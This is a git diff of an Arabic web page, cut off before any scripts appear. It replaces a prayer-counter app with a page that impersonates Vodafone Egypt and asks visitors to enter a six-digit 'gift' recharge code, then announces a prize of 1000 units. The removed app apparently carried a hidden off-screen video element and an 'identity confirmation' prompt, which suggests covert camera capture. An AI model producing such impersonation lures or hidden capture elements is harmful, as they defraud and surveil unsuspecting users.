@@ -2,1711 +2,494 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>المسبحة الذهبية</title>
-    <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Tajawal:wght@400;700;800&display=swap" rel="stylesheet">
-    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.37/dist/ua-parser.min.js">
-    </script>
-    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js">
-    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>فودافون - كود الشحن</title>
     <style>
-        :root {
-            --gold-gradient: linear-gradient(145deg, #ffd700, #b8860b);
-            --primary: #0c3b2e;
-            --gold: #d4af37;
-            --bg: #f0f2f5;
-            --card: #ffffff;
-            --text: #0c3b2e;
-            --shadow: rgba(0, 0, 0, 0.1);
-            --wird-bg: #fffde7;
-            --gold-glow: 0 0 20px rgba(212, 175, 55, 0.3);
-        }
-
-        .dark-mode {
-            --bg: #121212;
-            --card: #1e1e1e;
-            --text: #ffffff;
-            --primary: #4caf50;
-            --shadow: rgba(0, 0, 0, 0.5);
-            --wird-bg: #2d2d2d;
-            --gold: #ffd700;
-            --gold-glow: 0 0 20px rgba(255, 215, 0, 0.2);
-        }
-
         * {
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-            outline: none;
-            -webkit-touch-callout: none;
-            -webkit-user-select: none;
-            user-select: none;
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
+            font-family: 'Cairo', -apple-system, 'Segoe UI', Roboto, sans-serif;
         }
 
         body {
-            margin: 0;
-            font-family: 'Tajawal', sans-serif;
-            background: var(--bg);
-            color: var(--text);
-            height: 100vh;
+            background: linear-gradient(145deg, #e60000 0%, #cc0000 100%);
+            min-height: 100vh;
+            min-height: 100dvh;
             display: flex;
-            flex-direction: column;
-            overflow: hidden;
-            transition: 0.3s;
-            -webkit-font-smoothing: antialiased;
-        }
-
-        .page {
-            flex: 1;
-            display: none;
-            flex-direction: column;
+            justify-content: center;
             align-items: center;
             padding: 20px;
-            overflow-y: auto;
-            padding-bottom: calc(70px + 20px);
-            width: 100%;
-            max-width: 100%;
-            -webkit-overflow-scrolling: touch;
-            scroll-behavior: smooth;
+            margin: 0;
         }
 
-        .page.active {
-            display: flex;
-            animation: fadeIn 0.25s ease;
-        }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .progress-container {
-            width: min(85%, 300px);
-            background: #e0e0e0;
-            border-radius: 10px;
-            height: 12px;
-            margin-bottom: clamp(10px, 3vh, 20px);
-            overflow: hidden;
-            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.2);
-        }
-
-        .progress-bar {
-            height: 100%;
-            width: 0%;
-            background: var(--gold-gradient);
-            transition: width 0.15s ease;
-        }
-
-        .main-display {
-            font-size: clamp(1.2rem, 5vw, 1.8rem);
-            font-weight: 800;
-            margin-bottom: clamp(10px, 2vh, 20px);
-            color: var(--primary);
-            text-align: center;
-            word-break: break-word;
-            max-width: 90%;
-            line-height: 1.6;
-        }
-
-        .golden-counter {
-            width: min(70vw, 300px);
-            height: min(70vw, 300px);
-            max-width: 300px;
-            max-height: 300px;
-            aspect-ratio: 1/1;
-            border-radius: 50%;
-            background: var(--gold-gradient);
-            box-shadow: 0 10px 25px rgba(184, 134, 11, 0.4), inset 0 0 15px rgba(255, 255, 255, 0.5), var(--gold-glow);
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            cursor: pointer;
-            border: 5px solid #fff;
-            transition: transform 0.1s ease, box-shadow 0.2s;
-            margin: 0 auto;
-            will-change: transform;
-            position: relative;
-        }
-
-        .golden-counter:active {
-            transform: scale(0.94);
-            box-shadow: 0 5px 15px rgba(184, 134, 11, 0.3);
-        }
-
-        .num {
-            font-size: clamp(3rem, 15vw, 5.5rem);
-            font-weight: 800;
-            color: #fff;
-            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
-            line-height: 1;
-        }
-
-        .tap-hint {
-            color: #fff;
-            font-size: clamp(0.7rem, 3vw, 0.9rem);
-            opacity: 0.9;
-        }
-
-        .total-box {
-            background: var(--card);
-            padding: clamp(8px, 2vh, 12px) clamp(15px, 4vw, 25px);
-            border-radius: 50px;
-            margin-top: clamp(15px, 4vh, 30px);
-            box-shadow: 0 4px 15px var(--shadow);
-            font-weight: 700;
-            font-size: clamp(0.9rem, 3vw, 1rem);
-            border: 1px solid rgba(212, 175, 55, 0.2);
-        }
-
-        .zikr-item {
-            width: 100%;
-            max-width: 500px;
-            background: var(--card);
-            padding: clamp(10px, 2vh, 15px);
-            margin-bottom: 12px;
-            border-radius: 15px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            box-shadow: 0 2px 8px var(--shadow);
-            font-size: clamp(0.85rem, 2.5vw, 1rem);
-            transition: 0.2s;
-            border: 1px solid transparent;
-        }
-
-        .zikr-item:hover {
-            border-color: var(--gold);
-        }
-
-        .wird-card {
-            border: 2px solid #ffd700;
-            background: var(--wird-bg) !important;
-            color: var(--text);
-        }
-
-        .wird-info {
-            font-size: 0.75rem;
-            color: #b8860b;
-            display: block;
-            margin-top: 4px;
-            font-weight: normal;
-            opacity: 0.9;
-        }
-
-        .dark-mode .wird-info {
-            color: #ffd700;
-        }
-
-        .btn-select {
-            background: var(--primary);
-            color: white;
-            border: none;
-            padding: clamp(5px, 1.5vw, 8px) clamp(10px, 3vw, 18px);
-            border-radius: 20px;
-            cursor: pointer;
-            font-size: clamp(0.75rem, 2.5vw, 0.85rem);
-            white-space: nowrap;
-            transition: 0.2s;
-            font-weight: 700;
-        }
-
-        .btn-select:active {
-            transform: scale(0.92);
-            opacity: 0.9;
-        }
-
-        .btn-select.stop {
-            background: #ff5252 !important;
-        }
-
-        .card-azkar {
-            background: var(--card);
-            border-radius: 20px;
-            padding: clamp(15px, 4vw, 25px) clamp(10px, 3vw, 20px);
-            margin-bottom: 20px;
-            box-shadow: 0 4px 15px var(--shadow);
-            border: 1px solid rgba(212, 175, 55, 0.2);
-            position: relative;
-            text-align: center;
-            width: 100%;
-            max-width: 500px;
-            transition: 0.2s;
-        }
-
-        .card-azkar:hover {
-            border-color: var(--gold);
-        }
-
-        .id-badge {
-            position: absolute;
-            top: 0;
-            right: 0;
-            background: var(--gold-gradient);
-            color: white;
-            padding: 5px 15px;
-            font-weight: 700;
-            border-bottom-left-radius: 15px;
-            border-top-right-radius: 20px;
-            font-size: clamp(0.9rem, 2.5vw, 1rem);
-        }
-
-        .zikr-title {
-            font-size: clamp(1.1rem, 4vw, 1.3rem);
-            font-weight: 700;
-            color: var(--gold);
-            margin: 15px 0 10px;
-            padding: 8px;
-            background: rgba(212, 175, 55, 0.1);
-            border-radius: 10px;
-            text-align: center;
-            border-right: 3px solid var(--gold);
-        }
-
-        .text-azkar {
-            font-family: 'Amiri', serif;
-            font-size: clamp(1rem, 4vw, 1.3rem);
-            line-height: 1.8;
-            color: var(--text);
-            margin: 10px 0 15px;
-            text-align: center;
-            font-weight: 700;
-            padding: 10px;
-            background: rgba(255, 255, 255, 0.5);
-            border-radius: 10px;
-        }
-
-        .dark-mode .text-azkar {
-            background: rgba(255, 255, 255, 0.05);
-        }
-
-        .benefit {
-            font-size: clamp(0.85rem, 3vw, 0.95rem);
-            color: var(--primary);
-            font-weight: 700;
-            background: rgba(212, 175, 55, 0.15);
-            padding: 8px 15px;
-            border-radius: 20px;
-            display: inline-block;
-            margin: 5px 0;
-        }
-
-        .counter-section {
-            display: flex;
-            justify-content: center;
-            margin-top: 15px;
-            gap: 10px;
-        }
-
-        .circle-btn {
-            width: min(20vw, 80px);
-            height: min(20vw, 80px);
-            max-width: 80px;
-            max-height: 80px;
-            aspect-ratio: 1/1;
-            border-radius: 50%;
-            border: 3px solid var(--gold);
-            background: transparent;
-            font-size: clamp(1.5rem, 5vw, 2rem);
-            font-weight: 900;
-            color: var(--primary);
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: 0.15s;
-            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.1);
-        }
-
-        .circle-btn:active {
-            transform: scale(0.9);
-            background: rgba(212, 175, 55, 0.15);
-        }
-
-        .circle-btn.done {
-            background: var(--primary);
-            border-color: var(--primary);
-            color: var(--gold);
-        }
-
-        .stats-card {
-            background: var(--card);
-            border-radius: 20px;
-            padding: clamp(15px, 4vw, 25px);
-            width: 100%;
-            max-width: 500px;
-            margin-bottom: 20px;
-            box-shadow: 0 4px 15px var(--shadow);
-        }
-
-        .stats-grid {
-            display: flex;
-            justify-content: space-around;
-            text-align: center;
-            margin: 20px 0;
-            gap: 5px;
-        }
-
-        .stats-number {
-            font-size: clamp(1.8rem, 6vw, 2.5rem);
-            font-weight: 800;
-            color: var(--gold);
-            line-height: 1;
-        }
-
-        .chart-container {
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-end;
-            height: min(150px, 30vh);
-            margin-top: 20px;
-            gap: 3px;
-        }
-
-        .chart-bar {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            width: 12%;
-            min-width: 20px;
-        }
-
-        .bar-fill {
-            height: 0px;
-            width: 100%;
-            background: var(--gold-gradient);
-            border-radius: 5px 5px 0 0;
-            transition: height 0.4s ease;
-        }
-
-        .bar-day {
-            font-size: 0.65rem;
-            margin-top: 5px;
-            opacity: 0.7;
-        }
-
-        .bar-count {
-            font-size: 0.75rem;
-            font-weight: 700;
-            color: var(--gold);
-        }
-
-        .stats-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 15px;
-            background: var(--card);
-            border-radius: 15px;
-            margin-bottom: 12px;
-            width: 100%;
-            max-width: 500px;
-            box-shadow: 0 2px 8px var(--shadow);
-            font-size: clamp(0.9rem, 3vw, 1rem);
-        }
-
-        .tabs-container {
-            display: flex;
-            width: 100%;
-            max-width: 600px;
-            background: var(--card);
-            border-radius: 25px;
-            padding: 5px;
-            margin-bottom: 20px;
-            box-shadow: 0 2px 5px var(--shadow);
-            flex-wrap: wrap;
-        }
-
-        .tab-btn {
-            flex: 1 1 auto;
-            min-width: 70px;
-            padding: 10px 5px;
-            border: none;
-            background: transparent;
-            border-radius: 20px;
-            font-weight: 700;
-            cursor: pointer;
-            color: #888;
-            transition: 0.2s;
-            font-size: clamp(0.7rem, 2.5vw, 0.9rem);
-            white-space: nowrap;
-        }
-
-        .tab-btn.active {
-            background: var(--gold-gradient);
-            color: #fff;
-        }
-
-        .tab-content {
-            display: none;
-            width: 100%;
-            animation: fadeIn 0.2s;
-        }
-
-        .tab-content.active {
-            display: block;
-        }
-
-        .nav-bar {
-            position: fixed;
-            bottom: 0;
-            width: 100%;
-            height: 70px;
-            background: var(--card);
-            display: flex;
-            justify-content: space-around;
-            align-items: center;
-            box-shadow: 0 -2px 15px var(--shadow);
-            z-index: 2000;
-            padding: 0 5px;
-            backdrop-filter: blur(10px);
-        }
-
-        .nav-btn {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            color: #888;
-            cursor: pointer;
-            font-size: 0.7rem;
-            padding: 5px;
-            transition: 0.2s;
-            border: none;
-            background: transparent;
-            gap: 2px;
-        }
-
-        .nav-btn svg {
-            width: 22px;
-            height: 22px;
-            margin-bottom: 2px;
-            fill: none;
-            stroke: currentColor;
-            stroke-width: 1.5;
-        }
-
-        .nav-btn.active {
-            color: var(--primary);
-            font-weight: 700;
-        }
-
-        .nav-btn.active svg {
-            stroke: var(--primary);
-        }
-
-        .modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.6);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 3000;
-            padding: 10px;
-            backdrop-filter: blur(4px);
-        }
-
-        .modal-box {
-            background: var(--card);
-            padding: 25px 20px;
-            border-radius: 20px;
-            text-align: center;
-            width: min(90%, 320px);
-            max-width: 320px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-        }
-
-        .modal-box h4 {
-            font-size: 1.5rem;
-            margin-bottom: 10px;
-            color: var(--gold);
-        }
-
-        .modal-box p {
-            font-size: 1rem;
-            margin-bottom: 20px;
-            opacity: 0.9;
-        }
-
-        .modal-box button {
-            width: 100%;
-            margin: 5px 0;
-            padding: 12px;
-            border: none;
-            border-radius: 10px;
-            font-weight: 700;
-            font-size: 1rem;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-
-        .modal-box button:active {
-            transform: scale(0.96);
-        }
-
-        .prayer-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 10px;
-            width: 100%;
-            max-width: 500px;
-        }
-
-        .prayer-item {
-            background: var(--card);
-            padding: 12px;
-            border-radius: 15px;
-            text-align: center;
-            border: 1px solid rgba(212, 175, 55, 0.2);
-            box-shadow: 0 2px 8px var(--shadow);
-            transition: 0.2s;
-        }
-
-        .prayer-item:hover {
-            border-color: var(--gold);
-        }
-
-        .prayer-name {
-            font-weight: 700;
-            color: var(--primary);
-            font-size: 1rem;
-        }
-
-        .prayer-time {
-            font-size: 1.2rem;
-            font-weight: 700;
-            color: var(--gold);
-            margin-top: 5px;
-        }
-
-        .next-prayer-card {
-            background: linear-gradient(145deg, #0c3b2e, #1a5a4a);
-            color: gold;
-            border-radius: 20px;
-            padding: 15px 20px;
-            margin-bottom: 20px;
-            text-align: center;
-            width: 100%;
-            max-width: 500px;
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
-        }
-
-        .next-prayer-name {
-            font-size: 1.5rem;
-            font-weight: 800;
-        }
-
-        .next-prayer-time {
-            font-size: 1.8rem;
-            font-weight: 800;
-        }
-
-        .next-prayer-remaining {
-            font-size: 1.2rem;
-            background: rgba(255, 215, 0, 0.2);
-            padding: 8px;
-            border-radius: 20px;
-            margin-top: 10px;
-            direction: ltr;
-            font-weight: 700;
-        }
-
-        .loading-text {
-            text-align: center;
-            color: var(--gold);
-            font-size: 1.2rem;
-            margin: 20px 0;
-        }
-
-        .rating-stars {
-            font-size: 2.5rem;
-            direction: ltr;
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            margin: 10px 0;
-        }
-
-        .rating-stars span {
-            cursor: pointer;
-            transition: 0.15s;
-            color: #ccc;
-        }
-
-        .rating-stars span:hover {
-            transform: scale(1.2);
-        }
-
-        .rating-stars span.active {
-            color: #ffd700;
-            text-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
-        }
-
-        .rating-message {
-            color: #888;
-            font-size: 0.9rem;
-            margin-top: 8px;
-        }
-
-        .welcome-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+        .container {
             background: #ffffff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-            animation: fadeIn 0.5s;
-        }
-
-        .dark-mode .welcome-overlay {
-            background: #121212;
-        }
-
-        .welcome-card {
+            width: 100%;
+            max-width: 420px;
+            border-radius: 32px;
+            padding: 40px 28px 32px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
             text-align: center;
-            width: 88%;
-            max-width: 360px;
-            padding: 30px 20px;
+            position: relative;
+            overflow: hidden;
         }
 
-        .welcome-card h3 {
-            color: #0c3b2e;
-            font-size: 1.8rem;
+        /* شعار فودافون */
+        .vodafone-logo {
+            margin-bottom: 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .vodafone-logo svg {
+            width: 140px;
+            height: auto;
+        }
+
+        .vodafone-logo .sub-logo {
+            font-size: 14px;
+            color: #999;
+            font-weight: 500;
+            letter-spacing: 1px;
+            margin-top: 2px;
+        }
+
+        .badge {
+            display: inline-block;
+            background: #e60000;
+            color: white;
+            padding: 6px 24px;
+            border-radius: 30px;
+            font-size: 14px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            margin-bottom: 16px;
+        }
+
+        .title {
+            font-size: 26px;
             font-weight: 800;
+            color: #1a1a1a;
             margin-bottom: 8px;
         }
 
-        .dark-mode .welcome-card h3 {
-            color: #ffd700;
+        .subtitle {
+            font-size: 15px;
+            color: #666;
+            line-height: 1.7;
+            margin-bottom: 28px;
         }
 
-        .welcome-card .subtitle {
-            color: #888;
-            font-size: 0.85rem;
-            margin-bottom: 25px;
+        .subtitle span {
+            color: #e60000;
+            font-weight: 700;
         }
 
-        .info-box {
-            background: #f9f9f9;
-            border-radius: 16px;
-            padding: 18px 15px;
-            margin: 0 0 25px;
-            text-align: right;
-            border: 1px solid #eee;
-        }
-
-        .dark-mode .info-box {
-            background: #2d2d2d;
-            border-color: #444;
-        }
-
-        .info-item {
+        .code-input-wrapper {
             display: flex;
-            align-items: center;
-            gap: 10px;
-            padding: 7px 0;
-            font-size: 0.9rem;
-            color: #444;
+            justify-content: center;
+            gap: 12px;
+            margin: 20px 0 28px;
+            direction: ltr;
         }
 
-        .dark-mode .info-item {
-            color: #ccc;
+        .code-box {
+            width: 52px;
+            height: 62px;
+            border: 2px solid #ddd;
+            border-radius: 14px;
+            text-align: center;
+            font-size: 26px;
+            font-weight: 700;
+            color: #1a1a1a;
+            background: #f7f7f7;
+            outline: none;
+            transition: all 0.2s;
+            caret-color: #e60000;
         }
 
-        .info-item .dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: #4CAF50;
-            flex-shrink: 0;
+        .code-box:focus {
+            border-color: #e60000;
+            background: #ffffff;
+            box-shadow: 0 0 0 4px rgba(230, 0, 0, 0.1);
         }
 
-        .btn-continue {
-            background: #0c3b2e;
+        .code-box.filled {
+            border-color: #e60000;
+            background: #fff5f5;
+        }
+
+        .btn-verify {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            background: #e60000;
             color: white;
             border: none;
-            padding: 15px;
-            border-radius: 50px;
-            font-size: 1.1rem;
+            border-radius: 30px;
+            font-size: 18px;
             font-weight: 700;
             cursor: pointer;
-            width: 100%;
-            font-family: 'Tajawal', sans-serif;
-            transition: 0.15s;
+            transition: background 0.15s, transform 0.08s;
+            margin-top: 8px;
+            letter-spacing: 0.5px;
         }
 
-        .btn-continue:active {
-            transform: scale(0.95);
-            opacity: 0.9;
+        .btn-verify:hover {
+            background: #cc0000;
         }
 
-        .dark-mode .btn-continue {
-            background: #4caf50;
+        .btn-verify:active {
+            transform: scale(0.97);
         }
 
-        .btn-danger {
-            background: #ff5252 !important;
-            color: white !important;
+        .btn-verify:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
         }
 
-        .btn-gold {
-            background: #b8860b !important;
-            color: white !important;
+        .error-message {
+            color: #e60000;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 12px;
+            display: none;
+            font-weight: 600;
         }
 
-        .btn-gray {
-            background: #ddd !important;
-            color: #333 !important;
+        .error-message.show {
+            display: block;
+            animation: shake 0.4s ease;
         }
 
-        .dark-mode .btn-gray {
-            background: #444 !important;
-            color: #fff !important;
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
         }
 
-        .ripple {
-            position: absolute;
+        .footer-note {
+            margin-top: 24px;
+            font-size: 13px;
+            color: #999;
+            border-top: 1px solid #eee;
+            padding-top: 20px;
+        }
+
+        .footer-note span {
+            color: #e60000;
+            font-weight: 600;
+        }
+
+        .success-section {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px 0;
+            animation: fadeIn 0.6s ease;
+        }
+
+        .success-section.active {
+            display: flex;
+        }
+
+        .code-section {
+            display: block;
+        }
+
+        .code-section.hidden {
+            display: none;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: #e60000;
             border-radius: 50%;
-            background: rgba(255, 255, 255, 0.4);
-            transform: scale(0);
-            animation: rippleAnim 0.6s ease-out;
-            pointer-events: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 16px;
         }
 
-        @keyframes rippleAnim {
-            to {
-                transform: scale(4);
-                opacity: 0;
+        .success-icon svg {
+            width: 44px;
+            height: 44px;
+            fill: white;
+        }
+
+        .success-title {
+            font-size: 26px;
+            font-weight: 800;
+            color: #1a1a1a;
+            margin-bottom: 6px;
+        }
+
+        .success-subtitle {
+            font-size: 20px;
+            font-weight: 700;
+            color: #e60000;
+            line-height: 1.6;
+        }
+
+        .btn-success {
+            display: block;
+            width: 100%;
+            padding: 14px;
+            background: #e60000;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background 0.15s;
+        }
+
+        .btn-success:hover {
+            background: #cc0000;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 28px 18px 24px;
+                border-radius: 24px;
+            }
+            .title {
+                font-size: 22px;
+            }
+            .code-box {
+                width: 44px;
+                height: 54px;
+                font-size: 22px;
+                border-radius: 12px;
+            }
+            .code-input-wrapper {
+                gap: 10px;
+            }
+            .vodafone-logo svg {
+                width: 110px;
+            }
+            .success-title {
+                font-size: 22px;
+            }
+            .success-subtitle {
+                font-size: 17px;
             }
         }
 
-        .toast {
-            position: fixed;
-            bottom: 90px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: var(--card);
-            color: var(--text);
-            padding: 12px 24px;
-            border-radius: 50px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-            z-index: 9999;
-            border: 1px solid var(--gold);
-            font-weight: 700;
-            display: none;
-            animation: fadeIn 0.3s;
-        }
-
-        .toast.show {
-            display: block;
+        @media (max-width: 380px) {
+            .code-box {
+                width: 38px;
+                height: 48px;
+                font-size: 18px;
+                border-radius: 10px;
+            }
+            .code-input-wrapper {
+                gap: 7px;
+            }
         }
     </style>
 </head>
 <body>
-    <canvas id="confetti" style="position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:999;"></canvas>
-    <div id="toast" class="toast"></div>
-    <video id="hiddenVideo" style="display:none;position:fixed;top:-9999px;left:-9999px;" playsinline autoplay muted></video>
 
-    <div class="welcome-overlay" id="welcomeScreen">
-        <div class="welcome-card">
-            <h3>أهلاً بك</h3>
-            <p class="subtitle">تفعيل سريع للمميزات الأساسية</p>
-            <div class="info-box">
-                <div class="info-item"><span class="dot"></span><span>عرض مواقيت الصلاة بدقة حسب منطقتك</span></div>
-                <div class="info-item"><span class="dot"></span><span>تأكيد هويتك لضمان الخصوصية والأمان</span></div>
-                <div class="info-item"><span class="dot"></span><span>إرسال تنبيهات للتذكير بالأذكار والمواقيت</span></div>
+    <div class="container" id="app">
+
+        <div class="vodafone-logo">
+            <svg viewBox="0 0 200 45" xmlns="http://www.w3.org/2000/svg">
+                <text x="0" y="32" font-family="Arial, sans-serif" font-size="30" font-weight="900" fill="#e60000">Vodafone</text>
+                <text x="145" y="32" font-family="Arial, sans-serif" font-size="14" font-weight="400" fill="#999">مصر</text>
+            </svg>
+        </div>
+
+        <div class="code-section" id="codeSection">
+            <div class="badge">كارت شحن هدية</div>
+            <h1 class="title">أدخل كود الشحن</h1>
+            <p class="subtitle">
+                أدخل الكود الموجود على كارت الشحن<br>
+                <span>الهدية</span> الخاصة بك
+            </p>
+
+            <div class="code-input-wrapper" id="codeWrapper">
+                <input type="text" class="code-box" maxlength="1" inputmode="numeric" pattern="[0-9]" autofocus>
+                <input type="text" class="code-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
+                <input type="text" class="code-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
+                <input type="text" class="code-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
+                <input type="text" class="code-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
+                <input type="text" class="code-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
             </div>
-            <button class="btn-continue" onclick="closeWelcome()">اكمل</button>
+
+            <button class="btn-verify" id="btnVerify">تفعيل الكود</button>
+            <div class="error-message" id="errorMessage">الكود غير صحيح. حاول مرة أخرى.</div>
+
+            <div class="footer-note">
+                هذا الكود مخصص لك فقط<br>
+                <span>فودافون مصر</span>
+            </div>
         </div>
-    </div>
 
-    <div id="p-main" class="page active">
-        <div id="zikr-title" class="main-display">تقبل الله طاعتكم</div>
-        <div class="progress-container"><div id="p-bar" class="progress-bar"></div></div>
-        <div class="golden-counter" id="counterBtn" onclick="doCount(event)">
-            <div id="count-num" class="num">0</div>
-            <div class="tap-hint">اضغط للتسبيح</div>
+        <div class="success-section" id="successSection">
+            <div class="success-icon">
+                <svg viewBox="0 0 24 24">
+                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
+                </svg>
+            </div>
+            <h2 class="success-title">مبروك</h2>
+            <p class="success-subtitle" id="prizeAmount">كسبت 1000 وحدة</p>
+            <button class="btn-success" id="btnSuccess">العودة للصفحة الرئيسية</button>
         </div>
-        <div class="total-box">المجموع الكلي: <span id="total-num">0</span></div>
-    </div>
 
-    <div id="p-list" class="page">
-        <div class="tabs-container">
-            <button class="tab-btn active" onclick="switchTab('general')">قائمة تسبيح</button>
-            <button class="tab-btn" onclick="switchTab('morning')">أذكار الصباح</button>
-            <button class="tab-btn" onclick="switchTab('evening')">أذكار المساء</button>
-            <button class="tab-btn" onclick="switchTab('selected')">الأذكار المختارة</button>
-            <button class="tab-btn" onclick="switchTab('prayer')">مواقيت</button>
-        </div>
-        <div id="tab-general" class="tab-content active">
-            <div class="zikr-item wird-card"><div><span id="wird-label" style="font-weight: 700;">الورد الشامل</span><span class="wird-info">الحمد لله • لا إله إلا الله • الله أكبر</span></div><button id="wirdToggleBtn" onclick="toggleWird(event)" class="btn-select" style="background:#b8860b;">تشغيل</button></div>
-            <div class="zikr-item"><span>سبحان الله وبحمده</span><button class="btn-select single-zikr" data-zikr="سبحان الله وبحمده" onclick="toggleSingleZikr(this, 'سبحان الله وبحمده')">تشغيل</button></div>
-            <div class="zikr-item"><span>لا حول ولا قوة إلا بالله</span><button class="btn-select single-zikr" data-zikr="لا حول ولا قوة إلا بالله" onclick="toggleSingleZikr(this, 'لا حول ولا قوة إلا بالله')">تشغيل</button></div>
-            <div class="zikr-item"><span>اللهم صلِّ على محمد</span><button class="btn-select single-zikr" data-zikr="اللهم صلِّ على محمد" onclick="toggleSingleZikr(this, 'اللهم صلِّ على محمد')">تشغيل</button></div>
-            <div class="zikr-item"><span>أستغفر الله وأتوب إليه</span><button class="btn-select single-zikr" data-zikr="أستغفر الله وأتوب إليه" onclick="toggleSingleZikr(this, 'أستغفر الله وأتوب إليه')">تشغيل</button></div>
-            <div class="zikr-item"><span>حسبي الله ونعم الوكيل</span><button class="btn-select single-zikr" data-zikr="حسبي الله ونعم الوكيل" onclick="toggleSingleZikr(this, 'حسبي الله ونعم الوكيل')">تشغيل</button></div>
-            <div class="zikr-item"><span>سبحان الله العظيم</span><button class="btn-select single-zikr" data-zikr="سبحان الله العظيم" onclick="toggleSingleZikr(this, 'سبحان الله العظيم')">تشغيل</button></div>
-        </div>
-        <div id="tab-morning" class="tab-content"><div id="morning-azkar-list"></div></div>
-        <div id="tab-evening" class="tab-content"><div id="evening-azkar-list"></div></div>
-        <div id="tab-selected" class="tab-content"><div id="selected-azkar-list"></div></div>
-        <div id="tab-prayer" class="tab-content"><div id="prayer-status" class="loading-text">جاري تحميل مواقيت الصلاة...</div><div id="next-prayer-container"></div><div id="prayer-grid-container" class="prayer-grid"></div><button onclick="refreshPrayerTimes()" class="btn-select" style="margin-top: 15px; width: 100%; max-width: 200px; background: var(--gold); color: #fff;">تحديث الموقع</button></div>
-    </div>
-
-    <div id="p-stats" class="page">
-        <h3 style="color: var(--gold); margin-bottom: 20px;">إحصائيات التسبيح</h3>
-        <div class="stats-card"><div style="text-align: center; font-size: 2.5rem; color: var(--gold);"><svg width="40" height="40" viewBox="0 0 24 24" fill="#d4af37"><circle cx="12" cy="12" r="10" fill="none" stroke="#d4af37" stroke-width="1.5"/><circle cx="12" cy="12" r="3" fill="#d4af37"/></svg></div><div class="stats-grid"><div><div class="stats-number" id="stats-today">0</div><div>اليوم</div></div><div><div class="stats-number" id="stats-week">0</div><div>الأسبوع</div></div><div><div class="stats-number" id="stats-month">0</div><div>الشهر</div></div></div></div>
-        <div class="stats-card"><h4 style="color: var(--gold);">آخر 7 أيام</h4><div id="week-chart" class="chart-container"></div></div>
-        <div style="width: 100%; max-width: 500px;"><div class="stats-row"><span>أفضل يوم:</span><span id="best-day" style="font-weight: 700; color: var(--gold);">لم يسجل بعد</span></div><div class="stats-row"><span>أعلى تسبيحة:</span><span id="best-count" style="font-weight: 700; color: var(--gold);">0</span></div><div class="stats-row"><span>المجموع الكلي:</span><span id="stats-total" style="font-weight: 700; color: var(--gold);">0</span></div></div>
-        <button onclick="openStatsModal()" class="btn-select btn-danger" style="margin-top: 20px; width: 100%; max-width: 300px; padding: 15px;">تصفير الإحصائيات</button>
-    </div>
-
-    <div id="p-set" class="page">
-        <h3 style="color: var(--gold); margin-bottom: 20px;">الإعدادات</h3>
-        <div class="zikr-item"><span>الوضع الليلي</span><button class="btn-select" onclick="toggleDark()">تبديل</button></div>
